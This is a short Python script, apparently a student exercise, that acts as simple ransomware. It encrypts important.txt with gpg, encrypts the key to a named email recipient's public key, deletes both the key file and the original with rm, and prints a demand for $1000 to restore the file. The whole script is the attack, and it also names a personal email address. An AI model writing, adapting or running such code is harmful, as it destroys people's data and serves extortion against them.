import subprocess

key1 = input("Enter your key>")

f = open("key.txt","w+")
f.write(key1)
f.close()

subprocess.run(["gpg","-c","--armor","important.txt"])

subprocess.run(["gpg","--import","mypubkey.asc"])

subprocess.run(["gpg","-a","-o","key.txt.asc","-e","-r","sdsa947@uowmail.edu.au","key.txt"])

subprocess.run(["rm","key.txt"])

subprocess.run(["rm","important.txt"])

print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1000 and send key.txt.asc to me")
